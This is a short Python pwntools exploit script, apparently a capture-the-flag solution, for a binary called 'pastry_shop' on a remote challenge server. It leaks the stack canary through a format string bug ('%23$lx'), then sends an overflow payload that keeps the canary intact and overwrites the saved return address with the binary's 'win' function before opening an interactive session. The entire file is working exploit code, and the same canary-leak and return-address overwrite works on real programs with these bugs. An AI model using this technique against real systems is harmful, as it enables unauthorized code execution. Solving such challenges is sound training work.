#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./pastry_shop', checksec=False)

#by sending AAAA.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx to get tht IDX
CANARY_IDX = 23
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP = 88

#p = process(elf.path)                   # connect locally to the compiled binary
p = remote("offsec.m0lecon.it", 13567)   # connect to the actual challenge server

p.recvuntil(b'dear customer?\n')
p.sendline(f"%{CANARY_IDX}$lx".encode())  
leak = p.recvline().strip()   #because of printf, we can get the canary 
canary = int(leak, 16)
log.info(f"canary = {canary:#x}")

p.recvuntil(b'to order?\n')
payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(elf.sym.win),
)
p.send(payload)
p.interactive()